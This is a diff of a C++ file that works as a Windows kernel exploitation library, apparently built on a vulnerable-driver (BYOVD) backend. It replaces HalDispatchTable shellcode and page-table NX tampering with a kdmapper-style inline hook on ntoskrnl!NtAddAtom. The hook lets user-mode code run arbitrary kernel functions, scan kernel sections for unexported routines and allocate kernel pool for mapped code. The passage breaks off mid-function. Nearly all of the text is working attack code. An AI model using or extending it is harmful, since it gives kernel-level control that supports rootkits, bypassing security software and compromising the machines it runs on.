@@ -9,6 +9,8 @@
 #include <cstring>
 #include <iostream>
 #include <mutex>
+#include <cstdlib>
+#include <cstdio>
 
 // MinGW does not expose these in winternl.h by default.
 #ifndef SystemModuleInformation
@@ -33,18 +35,6 @@ typedef struct _RTL_PROCESS_MODULES {
     RTL_PROCESS_MODULE_INFORMATION Modules[1];
 } RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
 
-// KPROFILE_SOURCE is normally in ntddk.h. We only need the value used by
-// NtQueryIntervalProfile to trigger HalDispatchTable[1].
-typedef enum _KPROFILE_SOURCE {
-    ProfileTime = 0,
-    ProfileAlignmentFixup = 1,
-    ProfileTotalIssues = 2
-} KPROFILE_SOURCE;
-
-#ifndef ProfileTotalIssues
-#define ProfileTotalIssues ((KPROFILE_SOURCE)2)
-#endif
-
 #ifdef _MSC_VER
 #pragma comment(lib, "ntdll.lib") // CMake links ntdll for other toolchains
 #endif
@@ -52,14 +42,14 @@ typedef enum _KPROFILE_SOURCE {
 namespace hinv {
 namespace kmem {
 
-// ---------------------------------------------------------------------------
-// PE helpers (work on raw headers read from kernel memory)
-// ---------------------------------------------------------------------------
-
 static std::wstring ToLower(std::wstring s) {
     std::transform(s.begin(), s.end(), s.begin(), ::towlower);
     return s;
 }
+
+// ---------------------------------------------------------------------------
+// Module name normalization
+// ---------------------------------------------------------------------------
 
 std::wstring NormalizeModuleName(const std::string& moduleName) {
     std::wstring s(moduleName.begin(), moduleName.end());
@@ -232,19 +222,6 @@ uint64_t ResolveKernelExport(byovd::IByovdBackend* backend, const wchar_t* modul
     return 0;
 }
 
-uint64_t FindHalDispatchTable(byovd::IByovdBackend* backend) {
-    uint64_t ntosBase = 0;
-    auto mods = EnumKernelModules();
-    for (const auto& m : mods) {
-        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
-            ntosBase = m.base;
-            break;
-        }
-    }
-    if (!ntosBase) return 0;
-    return GetKernelExport(backend, ntosBase, "HalDispatchTable");
-}
-
 // ---------------------------------------------------------------------------
 // OS version detection
 // ---------------------------------------------------------------------------
@@ -268,717 +245,206 @@ OsVersionInfo GetOsVersion() {
 }
 
 // ---------------------------------------------------------------------------
-// Kernel lock helpers
+// Arbitrary kernel function calls (kdmapper-style NtAddAtom hook)
 // ---------------------------------------------------------------------------
+//
+// Replaces the old HalDispatchTable shellcode machinery (which needed the
+// randomized PTE self-reference index and bugchecked this machine three
+// times). Instead, we overwrite the first bytes of ntoskrnl!NtAddAtom with
+// `mov rax, target; jmp rax` through the backend's read-only write primitive
+// (physical mapping on the Intel backend), then invoke ntdll!NtAddAtom from
+// usermode: the syscall lands in our hook with the original argument
+// registers, so the target runs in Ring 0 with our args and its return value
+// comes back in RAX. The prologue is always restored.
 
-bool AcquireKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int type) {
-    if (!backend || !lockAddress) return false;
-
-    const char* funcName = (type == 0) ? "ExAcquireResourceExclusiveLite" : "KeAcquireGuardedMutex";
-    uint64_t func = ResolveKernelExport(backend, L"ntoskrnl.exe", funcName);
-    if (!func) return false;
-
-    std::vector<uint8_t> sc;
-    auto PushU64 = [&](uint64_t v) {
-        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
-    };
-
-    // movabs rcx, 0 (patched -> ctxBase)
-    sc.insert(sc.end(), { 0x48, 0xB9 });
-    PushU64(0);
-    // movabs rdx, 0
-    sc.insert(sc.end(), { 0x48, 0xBA });
-    PushU64(0);
-    // push rbx
-    sc.insert(sc.end(), { 0x53 });
-    // mov rbx, rcx
-    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
-    // mov rcx, [rbx]        ; lock address
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
-    // mov rdx, 0            ; Wait = FALSE
-    sc.insert(sc.end(), { 0x48, 0x31, 0xD2 });
-    // mov rax, [rbx+0x08]   ; lock function
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
-    // sub rsp, 0x28
-    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
-    // call rax
-    sc.insert(sc.end(), { 0xFF, 0xD0 });
-    // add rsp, 0x28
-    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
-    // mov [rbx], rax        ; store BOOLEAN result at ctx[0]
-    sc.insert(sc.end(), { 0x48, 0x89, 0x03 });
-    // pop rbx
-    sc.insert(sc.end(), { 0x5B });
-    // ret
-    sc.push_back(0xC3);
-
-    ContextBuilder buildCtx = [lockAddress, func](uint64_t base) {
-        uint64_t data[2] = { lockAddress, func };
-        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
-                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
-    };
-
-    uint64_t result = 0;
-    if (!ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, &result)) {
-        return false;
+void Trace(const char* stage) {
+    static const std::string path = [] {
+        const char* p = std::getenv("HINV_TRACE");
+        return p ? std::string(p) : std::string();
+    }();
+    if (path.empty()) return;
+    if (FILE* f = std::fopen(path.c_str(), "ab")) {
+        std::fprintf(f, "%s\n", stage);
+        std::fclose(f); // close == flush: survives a bugcheck
     }
-    if (type == 0) {
-        // ExAcquireResourceExclusiveLite returns BOOLEAN in RAX.
-        return result != 0;
-    }
-    // KeAcquireGuardedMutex returns void, so RAX is meaningless. If the
-    // shellcode executed to completion, the acquire call itself was made;
-    // guarded mutex acquire cannot fail.
-    return true;
 }
 
-bool ReleaseKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int type) {
-    if (!backend || !lockAddress) return false;
+namespace detail {
 
-    const char* funcName = (type == 0) ? "ExReleaseResourceLite" : "KeReleaseGuardedMutex";
-    uint64_t func = ResolveKernelExport(backend, L"ntoskrnl.exe", funcName);
-    if (!func) return false;
-
-    std::vector<uint8_t> sc;
-    auto PushU64 = [&](uint64_t v) {
-        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
-    };
-
-    sc.insert(sc.end(), { 0x48, 0xB9 });
-    PushU64(0);
-    sc.insert(sc.end(), { 0x48, 0xBA });
-    PushU64(0);
-    sc.insert(sc.end(), { 0x53 });
-    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
-    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
-    sc.insert(sc.end(), { 0xFF, 0xD0 });
-    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
-    sc.insert(sc.end(), { 0x5B });
-    sc.push_back(0xC3);
-
-    ContextBuilder buildCtx = [lockAddress, func](uint64_t base) {
-        uint64_t data[2] = { lockAddress, func };
-        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
-                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
-    };
-
-    return ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, nullptr);
+static uint64_t KernelNtAddAtom(byovd::IByovdBackend* backend) {
+    static uint64_t cached = 0;
+    if (!cached) cached = ResolveKernelExport(backend, L"ntoskrnl.exe", "NtAddAtom");
+    return cached;
 }
 
+void* UserNtAddAtom() {
+    return reinterpret_cast<void*>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAddAtom"));
+}
+
+bool InstallCallHook(byovd::IByovdBackend* backend, uint64_t target, uint8_t (&original)[12]) {
+    Trace("kmem: hook install begin");
+    uint64_t ntAddAtom = KernelNtAddAtom(backend);
+    if (!ntAddAtom || !UserNtAddAtom()) { Trace("kmem: hook install failed (resolve)"); return false; }
+
+    if (!backend->ReadKernelMemory(ntAddAtom, original, 12)) { Trace("kmem: hook install failed (read)"); return false; }
+
+    uint8_t stub[12] = { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };
+    std::memcpy(stub + 2, &target, 8);
+    bool ok = backend->WriteReadOnlyMemory(ntAddAtom, stub, sizeof(stub));
+    Trace(ok ? "kmem: hook installed" : "kmem: hook install failed (write)");
+    return ok;
+}
+
+bool RemoveCallHook(byovd::IByovdBackend* backend, const uint8_t (&original)[12]) {
+    Trace("kmem: hook remove begin");
+    uint64_t ntAddAtom = KernelNtAddAtom(backend);
+    if (!ntAddAtom) return false;
+    bool ok = backend->WriteReadOnlyMemory(ntAddAtom, original, 12);
+    Trace(ok ? "kmem: hook removed" : "kmem: hook remove failed");
+    return ok;
+}
+
+} // namespace detail
+
 // ---------------------------------------------------------------------------
-// PTE manipulation helpers (x64 self-referential page tables)
+// Kernel pattern scanning (in-image reads only — always safe through the
+// backend because every byte of a loaded module's image is resident/mapped)
 // ---------------------------------------------------------------------------
 
-static uint64_t ComputePteAddress(uint64_t va, uint64_t selfRefIndex) {
-    uint64_t pteBase = (selfRefIndex << 39) | (selfRefIndex << 30) | (selfRefIndex << 21) | (selfRefIndex << 12);
-    // Sign-extend if needed.
-    if (pteBase & 0x0000800000000000ULL) {
-        pteBase |= 0xFFFF000000000000ULL;
+static uint64_t FindPatternInSectionKernel(byovd::IByovdBackend* backend, uint64_t moduleBase,
+                                           const char* sectionName,
+                                           const std::vector<uint8_t>& pattern,
+                                           const std::vector<bool>& mask) {
+    if (!backend || pattern.empty() || pattern.size() != mask.size()) return 0;
+
+    IMAGE_DOS_HEADER dos{};
+    if (!backend->ReadKernelMemory(moduleBase, &dos, sizeof(dos))) return 0;
+    IMAGE_NT_HEADERS64 nt{};
+    if (!backend->ReadKernelMemory(moduleBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
+
+    uint16_t numSections = nt.FileHeader.NumberOfSections;
+    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
+    uint64_t sectionTable = moduleBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
+    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return 0;
+
+    uint64_t secVa = 0;
+    uint32_t secSize = 0;
+    for (const auto& sec : sections) {
+        if (std::strncmp(reinterpret_cast<const char*>(sec.Name), sectionName, IMAGE_SIZEOF_SHORT_NAME) == 0) {
+            secVa = moduleBase + sec.VirtualAddress;
+            secSize = sec.Misc.VirtualSize;
+            break;
+        }
     }
-    // PTE virtual address: base + page-index * sizeof(PTE), with canonical-address masking.
-    return pteBase + ((va >> 9) & 0x7FFFFFFFF8ULL);
-}
+    if (!secVa || !secSize) return 0;
 
-// Try common self-referential PML4 indices used by Windows.
-static uint64_t FindPteBase(byovd::IByovdBackend* backend) {
-    static const uint64_t candidates[] = { 0x1ED, 0x1EDULL /*Win10*/, 0x1EDULL /*Win11*/ };
-    for (uint64_t idx : candidates) {
-        uint64_t pteBase = (idx << 39) | (idx << 30) | (idx << 21) | (idx << 12);
-        if (pteBase & 0x0000800000000000ULL) pteBase |= 0xFFFF000000000000ULL;
-        uint64_t probe = pteBase; // should be a valid kernel address in the PTE region
-        uint64_t dummy = 0;
-        if (backend->ReadKernelMemory(probe, &dummy, sizeof(dummy))) {
-            return idx;
+    constexpr size_t CHUNK = 0x1000;
+    std::vector<uint8_t> buffer(CHUNK + pattern.size());
+    for (uint32_t off = 0; off < secSize; off += CHUNK) {
+        uint32_t readSize = (off + CHUNK > secSize) ? (secSize - off) : CHUNK;
+        readSize = static_cast<uint32_t>(readSize + pattern.size());
+        if (off + readSize > secSize) readSize = secSize - off;
+        if (!backend->ReadKernelMemory(secVa + off, buffer.data(), readSize)) continue;
+
+        for (size_t i = 0; i + pattern.size() <= readSize; ++i) {
+            bool match = true;
+            for (size_t j = 0; j < pattern.size(); ++j) {
+                if (mask[j] && buffer[i + j] != pattern[j]) { match = false; break; }
+            }
+            if (match) return secVa + off + i;
         }
     }
     return 0;
 }
 
-// ---------------------------------------------------------------------------
-// Kernel shellcode execution via HalDispatchTable
-// ---------------------------------------------------------------------------
-
-using NtQueryIntervalProfileFn = NTSTATUS(NTAPI*)(KPROFILE_SOURCE ProfileSource, PULONG Interval);
-
-bool ExecuteKernelShellcode(byovd::IByovdBackend* backend,
-                            const std::vector<uint8_t>& shellcode,
-                            uint64_t arg1,
-                            uint64_t arg2,
-                            uint64_t* outResult) {
-    if (!backend || shellcode.empty() || shellcode.size() > 0x800) return false;
-
-    uint64_t halTable = FindHalDispatchTable(backend);
-    if (!halTable) {
-        std::cerr << "[hinv::kmem] Failed to locate HalDispatchTable\n";
-        return false;
+static uint64_t GetNtoskrnlBase() {
+    for (const auto& m : EnumKernelModules()) {
+        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) return m.base;
     }
+    return 0;
+}
 
-    // Resolve ntoskrnl base and find a writable section to host the shellcode.
-    uint64_t ntosBase = 0;
-    auto mods = EnumKernelModules();
-    for (const auto& m : mods) {
-        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
-            ntosBase = m.base;
-            break;
-        }
-    }
-    if (!ntosBase) {
-        std::cerr << "[hinv::kmem] Failed to locate ntoskrnl base\n";
-        return false;
-    }
+// MmSetPageProtection is documented since 1803 but not always exported. When
+// the export is missing, recover it with kdmapper's PAGELK pattern: a
+// `cmovcc + lea + call` sequence whose final E8 calls MmSetPageProtection.
+static uint64_t ResolveMmSetPageProtection(byovd::IByovdBackend* backend) {
+    static uint64_t cached = 0;
+    if (cached) return cached;
 
-    IMAGE_DOS_HEADER dos{};
-    if (!backend->ReadKernelMemory(ntosBase, &dos, sizeof(dos))) return false;
+    uint64_t addr = ResolveKernelExport(backend, L"ntoskrnl.exe", "MmSetPageProtection");
+    if (addr) { cached = addr; return addr; }
+
+    uint64_t ntosBase = GetNtoskrnlBase();
+    if (!ntosBase) return 0;
+
     IMAGE_NT_HEADERS64 nt{};
-    if (!backend->ReadKernelMemory(ntosBase + dos.e_lfanew, &nt, sizeof(nt))) return false;
+    {
+        IMAGE_DOS_HEADER dos{};
+        if (!backend->ReadKernelMemory(ntosBase, &dos, sizeof(dos))) return 0;
+        if (!backend->ReadKernelMemory(ntosBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
+    }
+    uint64_t imageEnd = ntosBase + nt.OptionalHeader.SizeOfImage;
 
-    uint16_t numSections = nt.FileHeader.NumberOfSections;
-    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
-    uint64_t sectionTable = ntosBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
-    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return false;
-
-    uint64_t codePage = 0;
-    std::vector<uint8_t> originalPage;
-    for (const auto& sec : sections) {
-        if (sec.Characteristics & IMAGE_SCN_MEM_WRITE) {
-            // Search for a zeroed-out region large enough for the shellcode.
-            uint64_t secVa = ntosBase + sec.VirtualAddress;
-            uint32_t scanSize = sec.Misc.VirtualSize;
-            if (scanSize > 0x10000) scanSize = 0x10000;
-            std::vector<uint8_t> region(scanSize);
-            if (!backend->ReadKernelMemory(secVa, region.data(), scanSize)) continue;
-
-            for (uint32_t off = 0; off + shellcode.size() + 0x10 <= scanSize; off += 0x10) {
-                bool clean = true;
-                for (size_t k = 0; k < shellcode.size() + 0x10; ++k) {
-                    if (region[off + k] != 0) { clean = false; break; }
-                }
-                if (clean) {
-                    codePage = secVa + off;
-                    originalPage.assign(region.begin() + off, region.begin() + off + shellcode.size());
-                    break;
-                }
+    // Pattern 1: 0F 45 ?? ?? 8D ?? ?? ?? FF FF E8 — E8 sits at match+10.
+    {
+        std::vector<uint8_t> pat = { 0x0F, 0x45, 0x00, 0x00, 0x8D, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xE8 };
+        std::vector<bool>   msk = { true, true, false, false, true, false, false, false, true, true, true };
+        uint64_t m = FindPatternInSectionKernel(backend, ntosBase, "PAGELK", pat, msk);
+        if (m) {
+            int32_t rel = 0;
+            if (ReadU32(backend, m + 11, reinterpret_cast<uint32_t&>(rel))) {
+                uint64_t target = m + 10 + 5 + rel;
+                if (target >= ntosBase && target < imageEnd) { cached = target; return target; }
             }
-            if (codePage) break;
         }
     }
 
-    if (!codePage) {
-        std::cerr << "[hinv::kmem] No suitable writable kernel scratch region found\n";
-        return false;
-    }
-
-    // Determine PTE self-ref index and make the scratch page executable.
-    uint64_t selfRefIdx = FindPteBase(backend);
-    if (!selfRefIdx) {
-        std::cerr << "[hinv::kmem] Cannot resolve self-referential page tables\n";
-        return false;
-    }
-
-    uint64_t pteVa = ComputePteAddress(codePage, selfRefIdx);
-    uint64_t originalPte = 0;
-    if (!ReadU64(backend, pteVa, originalPte)) {
-        std::cerr << "[hinv::kmem] Failed to read PTE\n";
-        return false;
-    }
-
-    // Clear NX bit (bit 63) while preserving everything else.
-    uint64_t execPte = originalPte & ~(1ULL << 63);
-    if (!WriteU64(backend, pteVa, execPte)) {
-        std::cerr << "[hinv::kmem] Failed to patch PTE\n";
-        return false;
-    }
-
-    // Read original HalDispatchTable[1].
-    uint64_t originalHalEntry = 0;
-    if (!ReadU64(backend, halTable + 8, originalHalEntry)) {
-        WriteU64(backend, pteVa, originalPte);
-        return false;
-    }
-
-    // Patch arguments at the beginning of shellcode if the caller used the arg placeholder pattern.
-    // We reserve a 16-byte header: movabs rcx, arg1 ; movabs rdx, arg2
-    std::vector<uint8_t> patched = shellcode;
-    auto PatchU64 = [&](size_t off, uint64_t value) {
-        if (off + 8 <= patched.size()) {
-            std::memcpy(patched.data() + off, &value, 8);
+    // Pattern 2 (some builds keep an extra mov in the middle):
+    // 0F 45 ?? ?? 45 8B ?? ?? ?? ?? 8D ?? ?? ?? ?? ?? ?? FF FF E8 — E8 at match+19.
+    {
+        std::vector<uint8_t> pat = { 0x0F, 0x45, 0x00, 0x00, 0x45, 0x8B, 0x00, 0x00, 0x00, 0x00,
+                                     0x8D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xE8 };
+        std::vector<bool>   msk = { true, true, false, false, true, true, false, false, false, false,
+                                    true, false, false, false, false, false, false, true, true, true };
+        uint64_t m = FindPatternInSectionKernel(backend, ntosBase, "PAGELK", pat, msk);
+        if (m) {
+            int32_t rel = 0;
+            if (ReadU32(backend, m + 20, reinterpret_cast<uint32_t&>(rel))) {
+                uint64_t target = m + 19 + 5 + rel;
+                if (target >= ntosBase && target < imageEnd) { cached = target; return target; }
+            }
         }
-    };
-    PatchU64(2, arg1);  // after 48 b9 (mov rcx, imm64)
-    PatchU64(12, arg2); // after 48 ba (mov rdx, imm64)
-
-    // Write shellcode into scratch region.
-    if (!backend->WriteKernelMemory(codePage, patched.data(), patched.size())) {
-        WriteU64(backend, pteVa, originalPte);
-        return false;
     }
 
-    // Overwrite HalDispatchTable[1] with our shellcode address.
-    if (!WriteU64(backend, halTable + 8, codePage)) {
-        backend->WriteKernelMemory(codePage, originalPage.data(), originalPage.size());
-        WriteU64(backend, pteVa, originalPte);
-        return false;
-    }
-
-    // Trigger execution from usermode.
-    auto NtQueryIntervalProfile = reinterpret_cast<NtQueryIntervalProfileFn>(
-        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryIntervalProfile"));
-
-    bool triggered = false;
-    if (NtQueryIntervalProfile) {
-        ULONG interval = 0;
-        NTSTATUS status = NtQueryIntervalProfile(ProfileTotalIssues, &interval);
-        triggered = NT_SUCCESS(status);
-    }
-
-    // Best-effort cleanup.
-    WriteU64(backend, halTable + 8, originalHalEntry);
-    backend->WriteKernelMemory(codePage, originalPage.data(), originalPage.size());
-    WriteU64(backend, pteVa, originalPte);
-
-    if (outResult && triggered) {
-        // The shellcode is expected to write its result into the usermode arg1 buffer.
-        // We do not read it here because arg1 semantics are caller-defined.
-        *outResult = 0;
-    }
-
-    return triggered;
+    return 0;
 }
 
 // ---------------------------------------------------------------------------
-// SMAP-safe kernel execution
-// ---------------------------------------------------------------------------
-
-bool ExecuteKernelShellcodeSmapSafe(byovd::IByovdBackend* backend,
-                                    const std::vector<uint8_t>& shellcode,
-                                    ContextBuilder buildContext,
-                                    uint64_t* outResult) {
-    if (!backend || shellcode.empty() || shellcode.size() > 0x400) return false;
-
-    uint64_t halTable = FindHalDispatchTable(backend);
-    if (!halTable) {
-        std::cerr << "[hinv::kmem] Failed to locate HalDispatchTable\n";
-        return false;
-    }
-
-    uint64_t ntosBase = 0;
-    auto mods = EnumKernelModules();
-    for (const auto& m : mods) {
-        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
-            ntosBase = m.base;
-            break;
-        }
-    }
-    if (!ntosBase) {
-        std::cerr << "[hinv::kmem] Failed to locate ntoskrnl base\n";
-        return false;
-    }
-
-    IMAGE_DOS_HEADER dos{};
-    if (!backend->ReadKernelMemory(ntosBase, &dos, sizeof(dos))) return false;
-    IMAGE_NT_HEADERS64 nt{};
-    if (!backend->ReadKernelMemory(ntosBase + dos.e_lfanew, &nt, sizeof(nt))) return false;
-
-    uint16_t numSections = nt.FileHeader.NumberOfSections;
-    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
-    uint64_t sectionTable = ntosBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
-    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return false;
-
-    uint64_t codePage = 0;
-    std::vector<uint8_t> originalPage;
-    constexpr size_t SCRATCH_TOTAL = 0x1000;
-
-    for (const auto& sec : sections) {
-        if (sec.Characteristics & IMAGE_SCN_MEM_WRITE) {
-            uint64_t secVa = ntosBase + sec.VirtualAddress;
-            uint32_t scanSize = sec.Misc.VirtualSize;
-            if (scanSize > 0x10000) scanSize = 0x10000;
-            std::vector<uint8_t> region(scanSize);
-            if (!backend->ReadKernelMemory(secVa, region.data(), scanSize)) continue;
-
-            for (uint32_t off = 0; off + SCRATCH_TOTAL <= scanSize; off += 0x1000) {
-                bool clean = true;
-                for (size_t k = 0; k < SCRATCH_TOTAL; ++k) {
-                    if (region[off + k] != 0) { clean = false; break; }
-                }
-                if (clean) {
-                    codePage = secVa + off;
-                    originalPage.assign(region.begin() + off, region.begin() + off + SCRATCH_TOTAL);
-                    break;
-                }
-            }
-            if (codePage) break;
-        }
-    }
-
-    if (!codePage) {
-        std::cerr << "[hinv::kmem] No suitable writable kernel scratch page found\n";
-        return false;
-    }
-
-    uint64_t selfRefIdx = FindPteBase(backend);
-    if (!selfRefIdx) {
-        std::cerr << "[hinv::kmem] Cannot resolve self-referential page tables\n";
-        return false;
-    }
-
-    uint64_t pteVa = ComputePteAddress(codePage, selfRefIdx);
-    uint64_t originalPte = 0;
-    if (!ReadU64(backend, pteVa, originalPte)) {
-        std::cerr << "[hinv::kmem] Failed to read PTE\n";
-        return false;
-    }
-
-    uint64_t execPte = originalPte & ~(1ULL << 63);
-    if (!WriteU64(backend, pteVa, execPte)) {
-        std::cerr << "[hinv::kmem] Failed to patch PTE\n";
-        return false;
-    }
-
-    uint64_t originalHalEntry = 0;
-    if (!ReadU64(backend, halTable + 8, originalHalEntry)) {
-        WriteU64(backend, pteVa, originalPte);
-        return false;
-    }
-
-    // Build kernel-resident context at codePage + 0x400.
-    uint64_t ctxBase = codePage + 0x400;
-    std::vector<uint8_t> ctx = buildContext(ctxBase);
-    if (ctx.empty() || ctx.size() > 0x400) {
-        WriteU64(backend, pteVa, originalPte);
-        return false;
-    }
-
-    // Patch shellcode arg1 with kernel context address.
-    std::vector<uint8_t> patched = shellcode;
-    auto PatchU64 = [&](size_t off, uint64_t value) {
-        if (off + 8 <= patched.size()) {
-            std::memcpy(patched.data() + off, &value, 8);
-        }
-    };
-    PatchU64(2, ctxBase);
-    PatchU64(12, 0);
-
-    // Write shellcode + context into the scratch page.
-    std::vector<uint8_t> page(SCRATCH_TOTAL, 0);
-    std::memcpy(page.data(), patched.data(), patched.size());
-    std::memcpy(page.data() + 0x400, ctx.data(), ctx.size());
-
-    if (!backend->WriteKernelMemory(codePage, page.data(), page.size())) {
-        WriteU64(backend, pteVa, originalPte);
-        return false;
-    }
-
-    if (!WriteU64(backend, halTable + 8, codePage)) {
-        backend->WriteKernelMemory(codePage, originalPage.data(), originalPage.size());
-        WriteU64(backend, pteVa, originalPte);
-        return false;
-    }
-
-    auto NtQueryIntervalProfile = reinterpret_cast<NtQueryIntervalProfileFn>(
-        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryIntervalProfile"));
-
-    bool triggered = false;
-    if (NtQueryIntervalProfile) {
-        ULONG interval = 0;
-        NTSTATUS status = NtQueryIntervalProfile(ProfileTotalIssues, &interval);
-        triggered = NT_SUCCESS(status);
-    }
-
-    // Read result from kernel context (first qword).
-    if (outResult && triggered) {
-        ReadU64(backend, ctxBase, *outResult);
-    }
-
-    WriteU64(backend, halTable + 8, originalHalEntry);
-    backend->WriteKernelMemory(codePage, originalPage.data(), originalPage.size());
-    WriteU64(backend, pteVa, originalPte);
-
-    return triggered;
-}
-
-// ---------------------------------------------------------------------------
-// Kernel memory allocation via shellcode
+// Kernel memory allocation / protection / driver entry
 // ---------------------------------------------------------------------------
 
 bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& outKernelVa) {
     if (!backend || size == 0) return false;
 
-    uint64_t allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePool2");
-    uint64_t poolType = 0x80; // POOL_FLAG_NON_PAGED_EXECUTE
+    // Same primitive kdmapper uses: ExAllocatePoolWithTag(NonPagedPool, ...).
+    // The pool is NX on Win8+; callers that execute from it must flip
+    // protection with ProtectKernelMemory.
+    uint64_t allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePoolWithTag");
     if (!allocFn) {
-        allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePoolWithTag");
-        poolType = 0; // NonPagedPool (executable pre-Win8; NX on Win8+)
-    }
-    if (!allocFn) {
-        std::cerr << "[hinv::kmem] ExAllocatePool2/WithTag not found\n";
+        std::cerr << "[hinv::kmem] ExAllocatePoolWithTag not found\n";
         return false;
     }
 
-    std::vector<uint8_t> sc;
-    auto PushU64 = [&](uint64_t v) {
-        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
-    };
-
-    // movabs rcx, 0   (patched -> ctxBase)
-    sc.insert(sc.end(), { 0x48, 0xB9 });
-    PushU64(0);
-    // movabs rdx, 0   (unused)
-    sc.insert(sc.end(), { 0x48, 0xBA });
-    PushU64(0);
-    // push rbx
-    sc.insert(sc.end(), { 0x53 });
-    // mov rbx, rcx          ; rbx = kernel context pointer
-    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
-    // mov rcx, [rbx+0x18]   ; PoolType / POOL_FLAGS
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x4B, 0x18 });
-    // mov rdx, [rbx+0x10]   ; NumberOfBytes
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x53, 0x10 });
-    // mov r8d, 'hinv'       ; Tag
-    sc.insert(sc.end(), { 0x41, 0xB8, 0x68, 0x69, 0x6E, 0x76 });
-    // mov rax, [rbx+0x08]   ; ExAllocatePool* VA
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
-    // sub rsp, 0x28         ; shadow space
-    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
-    // call rax
-    sc.insert(sc.end(), { 0xFF, 0xD0 });
-    // add rsp, 0x28
-    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
-    // mov [rbx], rax        ; store allocated VA at ctx[0]
-    sc.insert(sc.end(), { 0x48, 0x89, 0x03 });
-    // pop rbx
-    sc.insert(sc.end(), { 0x5B });
-    // ret
-    sc.push_back(0xC3);
-
-    ContextBuilder buildCtx = [allocFn, size, poolType](uint64_t base) {
-        uint64_t data[4] = { 0, allocFn, size, poolType };
-        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
-                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
-    };
-
-    uint64_t result = 0;
-    if (!ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, &result)) {
-        std::cerr << "[hinv::kmem] Allocator shellcode execution failed\n";
+    constexpr uint64_t NonPagedPool = 0;
+    constexpr uint64_t HinvTag = 0x766E6968; // 'hinv'
+    uint64_t allocated = 0;
+    if (!CallKernelFunction(backend, &allocated, allocFn, NonPagedPool,
+                            static_cast<uint64_t>(size), HinvTag))
         return false;
-    }
 
-    outKernelVa = result;
-    return (outKernelVa != 0);
+    outKernelVa = allocated;
+    return outKernelVa != 0;
 }
-
-// ---------------------------------------------------------------------------
-// Resolve a kernel DriverObject by name
-// ---------------------------------------------------------------------------
-
-uint64_t GetDriverObject(byovd::IByovdBackend* backend, const wchar_t* driverName) {
-    if (!backend || !driverName) return 0;
-
-    uint64_t obRef = ResolveKernelExport(backend, L"ntoskrnl.exe", "ObReferenceObjectByName");
-    uint64_t ioDriverType = ResolveKernelExport(backend, L"ntoskrnl.exe", "IoDriverObjectType");
-    if (!obRef || !ioDriverType) {
-        std::cerr << "[hinv::kmem] ObReferenceObjectByName or IoDriverObjectType not found\n";
-        return 0;
-    }
-
-    size_t nameLenBytes = std::wcslen(driverName) * sizeof(wchar_t);
-
-    std::vector<uint8_t> sc;
